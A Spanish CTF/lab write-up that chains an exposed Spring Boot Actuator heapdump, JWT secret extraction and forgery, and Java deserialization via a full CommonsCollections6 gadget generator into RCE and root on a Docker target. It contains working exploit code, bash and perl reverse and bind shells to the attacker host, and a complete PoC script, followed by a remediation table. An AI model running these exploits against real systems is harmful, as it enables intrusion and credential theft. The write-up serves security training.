Writeup — "Apadrina un Pingüino"

Máquina 172.17.0.2 (contenedor Docker) — Guía paso a paso

Dificultad: Media-Alta Tipo: Web / Spring Boot / Java Objetivo final: RCE → escalada a root → capturar el flag Flag: FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}

Resumen de la cadena de ataque

Reconocimiento (nmap)
│
▼
Spring Boot Actuator expuesto sin autenticación
│
▼
Descarga de /actuator/heapdump ──► extracción del secreto JWT
│
▼
Falsificación de JWT (rol USER → ADMIN) ──► panel /admin
│
▼
POST /admin/restore deserializa Java (Base64 + ObjectInputStream)
│
▼
Gadget CommonsCollections6 (commons-collections 3.2.1) ──► RCE (www-data)
│
▼
Credenciales en claro en /app/.env ──► reutilización → root
│
▼
FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}

1. Preparación del entorno
   
1.1 Comprobar la red

El objetivo es un contenedor Docker; el host que lo ataca ve la red docker0 .
ip -4 addr show
Salida relevante:
4: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
El atacante es 172.17.0.1 (puerta de enlace de Docker) y la víctima 172.17.0.2 .
1.2 Herramientas necesarias
sudo apt update
sudo apt install -y nmap ffuf gobuster nikto sqlmap curl wget netcat-traditional default-jdk
maven unzip
Opcional (para wordlists):
sudo apt install -y seclists
Nota: nc en el contenedor de pruebas debe ser la variante nc -lvnp .
2. Reconocimiento (nmap)
2.1 Descubrimiento de host
ping -c 3 172.17.0.2
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.068 ms
ttl=64 indica Linux, probablemente un contenedor.
2.2 Escaneo de puertos y servicios
nmap -Pn -sS -sV -sC -p- --min-rate 2000 -T4 172.17.0.2 -oA nmap_full
Resultado:
PORT STATE SERVICE VERSION
8080/tcp open nagios-nsca Nagios NSCA
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apadrina un Pingüino
MAC Address: 4E:18:3D:71:20:EF (Unknown)
Interpretación: solo el puerto 8080/tcp está abierto, sirviendo una aplicación web titulada
"Apadrina un Pingüino".
3. Enumeración web
3.1 Cabeceras y página principal
curl -sI http://172.17.0.2:8080/
curl -s http://172.17.0.2:8080/ | head -60
Cabeceras:
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Transfer-Encoding: chunked
Content-Language y Transfer-Encoding: chunked son típicos de un backend Java/Spring. En la
home aparecen los enlaces /login , /register , /pinguinos .
3.2 Fuzzing de directorios
Con ffuf (o gobuster ):
ffuf -u http://172.17.0.2:8080/FUZZ \
-w /usr/share/seclists/Discovery/Web-Content/common.txt \
-mc all -fc 404 -t 60
Alternativa rápida manual:
for p in admin login register logout pinguinos perfil error actuator \
actuator/health actuator/env actuator/heapdump actuator/mappings \
robots.txt sitemap.xml favicon.ico; do
code=$(curl -s -o /dev/null -w "%{http_code}" http://172.17.0.2:8080/$p)
echo "$code /$p"
done

Resultados relevantes:
403 /admin
200 /login
200 /register
302 /logout
200 /pinguinos
200 /perfil (requiere sesión)
200 /actuator
200 /actuator/health
200 /actuator/env
200 /actuator/heapdump
200 /actuator/mappings
Hallazgo: /admin existe pero devuelve 403 (requiere privilegios) y aparece un Spring Boot
Actuator totalmente accesible.
4. Spring Boot Actuator expuesto
4.1 Listar los endpoints disponibles
curl -s http://172.17.0.2:8080/actuator | python3 -m json.tool
Devuelve todos los enlaces. Los más sensibles:
beans, caches, conditions, configprops, env, heapdump,
loggers, mappings, metrics, scheduledtasks, threaddump
4.2 Mapa de rutas de la aplicación ( mappings )
curl -s http://172.17.0.2:8080/actuator/mappings -o mappings.json
python3 - <<'EOF'
import json, re
s = open('mappings.json').read()
for p in sorted(set(re.findall(r'"predicate":"[^"]*"', s))):
print(p[:160])
EOF
Rutas de la aplicación (controladores):
{GET [/]} SiteController.home
{GET [/pinguinos]} SiteController.list
{GET [/perfil]} SiteController.profile
{POST [/apadrinar/{id}]} SiteController.sponsor
{GET [/login]} {POST [/login]} AuthController
{GET [/register]} {POST [/register]} AuthController
{GET [/logout]} AuthController
{GET [/admin]} AdminController.adminPanel
{POST [/admin/restore]} AdminController.restore ← INTERESANTE
POST /admin/restore ("restore" = restaurar copia de seguridad) es un candidato claro.

4.3 env (información de entorno)
curl -s http://172.17.0.2:8080/actuator/env | python3 -m json.tool | head -80
Los valores salen enmascarados con ****** , pero confirma que existe la propiedad
app.jwt.secret (clave de firma de los JWT). El valor real habrá que buscarlo en el
heapdump.
5. Registro de usuario y análisis del JWT
5.1 Crear una cuenta
curl -s -i -c cookies.txt -X POST http://172.17.0.2:8080/register \
-d "username=audit01&email=audit01@test.com&password=Audit1234!"
Respuesta:
HTTP/1.1 302
Set-Cookie: session=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdWRpdDAxIiwicm9sZSI6IlVTRVIi...
Location: http://172.17.0.2:8080/perfil
5.2 Decodificar el JWT
La cookie session es un JWT HS256. Decodificamos la parte de payload:
echo
'eyJzdWIiOiJhdWRpdDAxIiwicm9sZSI6IlVTRVIiLCJpYXQiOjE3OTIxMTc0MTksImV4cCI6MTc5MjEyMTAxOX0' |
base64 -d
{"sub":"audit01","role":"USER","iat":1792117419,"exp":1792121019}
Clave: el rol viaja dentro del token ( role: USER ). Si conseguimos el secreto de firma,
podemos forjar un token con role: ADMIN .
5.3 Intentar romper el secreto con diccionario (opcional)
echo
'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdWRpdDAxIiwicm9sZSI6IlVTRVIiLCJpYXQiOjE3OTIxMTc0MTksImV4cC
I6MTc5MjEyMTAxOX0.FZckzz78-lEGoyB87nwrylOqUFRz_IpGfRFWrwJeZvU' > jwt.txt
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
No estaba en rockyou . Lo obtendremos del heapdump .

6. Fuga de secretos vía heapdump
El endpoint /actuator/heapdump entrega toda la memoria de la JVM, donde las claves de
configuración están en claro (a diferencia de /actuator/env , que las enmascara).
6.1 Descargar el heap
curl -s http://172.17.0.2:8080/actuator/heapdump -o heapdump.hprof
ls -la heapdump.hprof # ~79 MB
file heapdump.hprof # Java HPROF dump
6.2 Búsqueda rápida con strings
strings -n 6 heapdump.hprof | grep -iE "jwt|secret|password|flag" | sort -u | head -40
Aparece el flag y las propiedades:
FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
${app.jwt.secret}
${app.jwt.previous-secret}
La clave no sale como texto plano en un strings genérico porque se almacena como
char[] / byte[] . Hay que parsear el heap o buscar arrays.
6.3 Extraer el secreto con un parser de HPROF
Guardamos este script como find_jwt.py . Recorre los registros de arrays primitivos ( byte[] /
char[] ) y prueba cada candidato como clave HMAC del JWT que conocemos:

import struct, hmac, hashlib, base64, re
data = open('heapdump.hprof', 'rb').read()
IDS = 8
# JWT obtenido en el registro (header.payload.firma)
tok =
"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdWRpdDAxIiwicm9sZSI6IlVTRVIiLCJpYXQiOjE3OTIxMTc0MTksImV4cC
I6MTc5MjEyMTAxOX0.FZckzz78-lEGoyB87nwrylOqUFRz_IpGfRFWrwJeZvU"
h, p, s = tok.split('.')
msg = f"{h}.{p}".encode()
sig = base64.urlsafe_b64decode(s + '=' * (-len(s) % 4))
def test(k):
try: return hmac.new(k, msg, hashlib.sha256).digest() == sig
except Exception: return False
pos = 31 # cabecera HPROF: 19 + id_size(4) + timestamp(8)
n = len(data)
while pos + 9 <= n:
tag = data[pos]
length = struct.unpack('>I', data[pos+5:pos+9])[0]
payload, end = pos + 9, pos + 9 + length
if tag in (0x0c, 0x1c): # HEAP DUMP segment
sp = payload
while sp < end - 1:
st = data[sp]
if st == 0x21: # INSTANCE
num = struct.unpack('>I', data[sp+1+IDS+4+IDS:sp+1+IDS+4+IDS+4])[0]
sp += 1 + IDS + 4 + IDS + 4 + num
elif st == 0x22: # OBJECT ARRAY
cnt = struct.unpack('>I', data[sp+1+IDS+4:sp+1+IDS+8])[0]
sp += 1 + IDS + 4 + 4 + IDS + cnt * IDS
elif st == 0x23: # PRIMITIVE ARRAY
cnt = struct.unpack('>I', data[sp+1+IDS+4:sp+1+IDS+8])[0]
etype = data[sp+1+IDS+8]; start = sp + 1 + IDS + 9
if etype == 5: # char[]
txt = data[start:start+cnt*2].decode('utf-16-be', 'replace')
if 6 <= len(txt) <= 200 and re.fullmatch(r'[ -~]+', txt):
if test(txt.encode('utf-8')): print("SECRETO JWT:", repr(txt))
sp = start + cnt*2
elif etype == 8: # byte[]
raw = data[start:start+cnt]
if 6 <= cnt <= 200 and all(32 <= x < 127 for x in raw) and len(set(raw))
> 1:
if test(raw): print("SECRETO JWT:", raw)
sp = start + cnt
else:
sizes = {4:1,6:4,7:8,9:2,10:4,11:8}
sp = start + cnt*sizes.get(etype,1)
else:
break
pos = end
Ejecutamos:
python3 find_jwt.py
Resultado:

SECRETO JWT: b'changeme-super-secret-key-pinguinos-prod-2024'
Truco: en el heap también aparece app.jwt.previous-secret=...-2023 . Es un señuelo
(clave antigua rotada que ya no firma nada). La válida es la de 2024 .
7. Falsificación de JWT → escalada a ADMIN
Con el secreto changeme-super-secret-key-pinguinos-prod-2024 , forjamos un token con role:
ADMIN . Guardamos este script como forge_jwt.py :
import hmac, hashlib, base64, json, time
def b64(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
secret = b'changeme-super-secret-key-pinguinos-prod-2024'
now = int(time.time())
header = b64(json.dumps({"alg": "HS256"}).encode())
payload = b64(json.dumps({
"sub": "admin",
"role": "ADMIN",
"iat": now,
"exp": now + 3600
}).encode())
sig = b64(hmac.new(secret, f"{header.decode()}.{payload.decode()}".encode(),
hashlib.sha256).digest())
print(f"{header.decode()}.{payload.decode()}.{sig.decode()}")
ADMIN_JWT=$(python3 forge_jwt.py)
echo $ADMIN_JWT
Acceder al panel de administración
curl -s -H "Cookie: session=$ADMIN_JWT" http://172.17.0.2:8080/admin
Antes devolvía 403; ahora devuelve 200 y el panel:
<h1>🔐 Panel de administración</h1>
<p>Conectado como <strong>admin</strong> (<span class="badge">ADMIN</span>)</p>
...
<div class="flag">🏴 <span>FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}</span></div>
<h2>⚙️ Restaurar copia de seguridad</h2>
<form method="post" action="/admin/restore">
<textarea name="backup" rows="5" ... placeholder="rO0ABXNyAC4uLg=="></textarea>
...
</form>

¡Flag a la vista! (pero vamos a por RCE).
Nota alternativa: el DataInitializer del jar crea cuentas por defecto
admin:Adm1n_C0lon14_2024 . También sirven para entrar como admin sin forjar el JWT.
8. Descubrimiento del endpoint vulnerable restore
Fíjate en el placeholder del formulario: rO0ABXNyAC4uLg== .
echo 'rO0ABXNyAC4uLg==' | base64 -d | xxd | head -1
00000000: aced 0005 7372 002e 2e2e ....sr....
0xACED0005 es la magia de serialización de Java ( ObjectOutputStream ). El endpoint recibe
un objeto Java serializado en Base64 y lo deserializa → Insecure Deserialization.
8.1 Confirmar el comportamiento
Generamos un objeto serializado benigno (un HashMap ) y lo enviamos:
// Ser.java
import java.io.*; import java.util.*;
public class Ser {
public static void main(String[] a) throws Exception {
ByteArrayOutputStream b = new ByteArrayOutputStream();
ObjectOutputStream o = new ObjectOutputStream(b);
o.writeObject(new HashMap<String,String>());
o.close();
System.out.println(Base64.getEncoder().encodeToString(b.toByteArray()));
}
}
javac Ser.java && java Ser
#
rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAA
AAB3CAAAABAAAAAAeA==
curl -s -X POST http://172.17.0.2:8080/admin/restore \
-H "Cookie: session=$ADMIN_JWT" \
--data-urlencode
"backup=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhw
P0AAAAAAAAB3CAAAABAAAAAAeA=="
Respuesta:
Copia de seguridad restaurada correctamente: java.util.HashMap
El servidor deserializó nuestro objeto y devolvió su nombre de clase. Confirmado.

8.2 Buscar librerías para un gadget chain
Necesitamos una librería con "gadgets" en el classpath. La obtenemos del propio
application.properties del jar o del heapdump. Descargamos el jar desde el RCE (o lo
extraemos) y buscamos:
# (más adelante, ya con RCE, transferimos /app/app.jar y hacemos)
unzip -l app.jar | grep -iE "commons-collections|spring-boot|jackson|snakeyaml"
Resultado clave:
BOOT-INF/lib/commons-collections-3.2.1.jar ← gadget CC1/CC5/CC6 disponible
BOOT-INF/lib/spring-boot-3.2.5.jar
BOOT-INF/lib/jjwt-impl-0.12.5.jar
commons-collections 3.2.1 es explotable con CommonsCollections6 (funciona en JDK
modernos, incluido Java 17).
9. Explotación de deserialización Java → RCE
9.1 Preparar el generador del gadget (CommonsCollections6)
Descarga la librería (para compilar el gadget localmente):
curl -O https://repo1.maven.org/maven2/commons-collections/commons-collections/3.2.1/
commons-collections-3.2.1.jar
Generador CC6.java :

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import java.io.*;
import java.lang.reflect.Field;
import java.util.*;
public class CC6 {
public static void main(String[] args) throws Exception {
String cmd = args[0];
// Cadena de transformers que ejecuta Runtime.getRuntime().exec(cmd)
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod",
new Class[]{String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}),
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}),
new InvokerTransformer("exec",
new Class[]{String.class},
new Object[]{cmd})
};
final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});
final Map innerMap = new HashMap();
final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
HashSet map = new HashSet(1);
map.add(entry); // dispara el hash (con cadena vacía)
lazyMap.clear(); // limpia para que se re-dispare al deserializar
// Inyecta la cadena real por reflexión (evita ejecución al construir)
Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
f.setAccessible(true);
f.set(transformerChain, transformers);
ByteArrayOutputStream b = new ByteArrayOutputStream();
ObjectOutputStream o = new ObjectOutputStream(b);
o.writeObject(map);
o.close();
System.out.print(Base64.getEncoder().encodeToString(b.toByteArray()));
}
}
Compilar:
javac -cp commons-collections-3.2.1.jar CC6.java
9.2 Construir el comando (evitando el problema de espacios)
Runtime.exec(String) separa por espacios. Para ejecutar comandos complejos usamos el
truco bash -c {echo,BASE64}|{base64,-d}|bash , que solo produce 3 tokens sin espacios
internos.
Ejemplo: reverse shell a nuestro host ( 172.17.0.1:4444 ).

# 1) script que ejecutará la víctima
SCRIPT='bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
B64=$(echo -n "$SCRIPT" | base64 -w0)
CMD="bash -c {echo,$B64}|{base64,-d}|bash"
# 2) generar el objeto serializado con la cadena CC6
PAYLOAD=$(java -cp .:commons-collections-3.2.1.jar CC6 "$CMD")
echo "${#PAYLOAD} bytes"
9.3 Recibir la shell
Terminal 1 (atacante) — ponemos a escuchar:
nc -lvnp 4444
Terminal 2 — enviamos el payload:
curl -s -X POST http://172.17.0.2:8080/admin/restore \
-H "Cookie: session=$ADMIN_JWT" \
--data-urlencode "backup=$PAYLOAD"
Respuesta del servidor:
Copia de seguridad restaurada correctamente: java.util.HashSet
Terminal 1 — recibimos la shell:
listening on [any] 4444 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 33410
www-data@acde5a284e97:/app$
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
hostname
# acde5a284e97
uname -a
# Linux acde5a284e97 ... x86_64 GNU/Linux
🎯 RCE conseguido como www-data .
Alternativa sin reverse shell (bind shell / OOB): si no tienes IP alcanzable desde la
víctima, puedes hacer que ejecute un comando y mande la salida por red: CMD='{ id;
hostname; env; } > /dev/tcp/172.17.0.1/4444 2>&1' y escuchar con nc -lvnp 4444 . O abrir
un bind shell con perl (ver anexos).

10. Post-explotación y escalada a root
10.1 Enumeración básica
ls -la /app
# -rw-r--r-- 1 www-data www-data 663 /app/.env
# -rw-r--r-- 1 www-data www-data 53M /app/app.jar
cat /app/.env
Contenido de /app/.env :
APP_ENV=production
APP_NAME=Apadrina un Pinguino
DB_HOST=db-prod.internal
DB_PORT=3306
DB_NAME=pinguinos
DB_USER=svc_pinguinos
DB_PASSWORD=Pr0d_Gl4c14r_Sync_2024
PARTNER_API_KEY=apikey_live_pngn_8f3a9c2e7b1d4f6a0c5e9d2b
# Clave de recuperacion de acceso del sistema.
# El equipo de sistemas la reutiliza como contrasena de la cuenta de soporte/root.
RECOVERY_KEY=recoverypasswordpenguin
Hallazgo: RECOVERY_KEY se reutiliza como contraseña de root.
10.2 Escalada a root (reutilización de credenciales)
echo 'recoverypasswordpenguin' | su root -c 'id'
# uid=0(root) gid=0(root) groups=0(root)
🎯 Somos root.
10.3 (Opcional) Volcar secretos de configuración del jar
cd /tmp
/opt/java/openjdk/bin/jar xf /app/app.jar BOOT-INF/classes/application.properties
cat BOOT-INF/classes/application.properties
Fragmento:
spring.datasource.password=Gl4c14r_DB_P4ss_2024!
app.jwt.secret=changeme-super-secret-key-pinguinos-prod-2024
app.jwt.previous-secret=changeme-super-secret-key-pinguinos-prod-2023 # señuelo
app.sync.production-datasource=jdbc:mysql://db-prod.internal:3306/pinguinos?
user=svc_pinguinos&password=Pr0d_Gl4c14r_Sync_2024
management.endpoints.web.exposure.include=* # Actuator totalmente expuesto

11. Flag
FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}
Se obtiene del panel /admin (y también aparece en el heapdump ).
12. Remediación
# Vulnerabilidad Remediación
1 Actuator expuesto
sin auth
management.endpoints.web.exposure.include=health,info y protegerlo
con autenticación
2 Secreto JWT en
claro
Rotar el secreto; usar claves aleatorias de ≥256 bits; no embeberlas;
eliminarlo de artefactos
3 Deserialización
Java insegura
No usar ObjectInputStream con datos del usuario; usar JSON (Jackson) o
filtro JEP 290 con allowlist; quitar commons-collections si no se usa
4 Credenciales por
defecto
Eliminar admin:Adm1n_C0lon14_2024 , forzar cambio inicial
5 Secretos en .env /
jar
Gestor de secretos (Vault/K8s Secrets); no versionar ni empaquetar
6 Reutilización de
credenciales → root
Contraseñas de root únicas; deshabilitar su /login root
7 Control de acceso
por claim JWT
Validar rol en servidor desde fuente fiable
8 Sin HTTPS/
cabeceras
HTTPS + HSTS + CSP + X-Content-Type-Options
13. Anexos (código completo)
Anexo A — Bind shell con perl (conexión estable)
Dentro de la RCE, para abrir un shell que tú conectas:
# El objetivo abre el puerto 4446; el atacante conecta con: nc 172.17.0.2 4446
CMD="perl -e 'use
Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));setsockopt(S,SOL_SOCKET,SO_REUS
EADDR,pack(\"l\",1));bind(S,sockaddr_in(4446,INADDR_ANY));listen(S,5);accept(C,S);open(STDIN
,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");system(\"/bin/bash -i\");'"

Anexo B — TTY completa
Si el contenedor tiene script (util-linux):
script -qec "/bin/bash -i" /dev/null
Anexo C — Reverse shell con perl
perl -e 'use Socket;$i="172.17.0.1";
$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet
_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash
-i");};'
Anexo D — One-liner del PoC completo (bash)
# Uso: ./pwn.sh
SECRET='changeme-super-secret-key-pinguinos-prod-2024'
JWT=$(python3 - <<PY
import hmac,hashlib,base64,json,time
b=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=')
s=b'$SECRET'; n=int(time.time())
h=b(json.dumps({"alg":"HS256"}).encode());
p=b(json.dumps({"sub":"admin","role":"ADMIN","iat":n,"exp":n+3600}).encode())
print(f"{h.decode()}.{p.decode()}.{b(hmac.new(s,f'{h.decode()}.
{p.decode()}'.encode(),hashlib.sha256).digest()).decode()}")
PY
)
SCRIPT='bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'
B64=$(echo -n "$SCRIPT" | base64 -w0)
CMD="bash -c {echo,$B64}|{base64,-d}|bash"
PAYLOAD=$(java -cp /tmp/opencode:/tmp/opencode/commons-collections-3.2.1.jar CC6 "$CMD")
curl -s -X POST http://172.17.0.2:8080/admin/restore -H "Cookie: session=$JWT" \
--data-urlencode "backup=$PAYLOAD"
Checklist rápido (para reproducir)
nmap -Pn -sS -sV -p- 172.17.0.2 → puerto 8080
curl http://172.17.0.2:8080/actuator → Actuator expuesto
curl http://172.17.0.2:8080/actuator/heapdump -o heapdump.hprof
Extraer el secreto JWT del heap → changeme-super-secret-key-pinguinos-prod-2024
Forjar JWT con role=ADMIN → entrar en /admin
Descubrir POST /admin/restore (deserializa Base64)
Generar gadget CC6 con commons-collections-3.2.1
nc -lvnp 4444 y enviar el payload → shell como www-data
cat /app/.env → RECOVERY_KEY=recoverypasswordpenguin
echo recoverypasswordpenguin | su root -c id → root
Flag: FLAG{actuator_h34pdump_jwt_f0rg3ry_pwn3d}

Documento generado como writeup de la auditoría. Uso exclusivo en entorno de laboratorio
autorizado.
Writeup - Apadrina un Pingüino (172.17.0.2) · Página 16 / 16
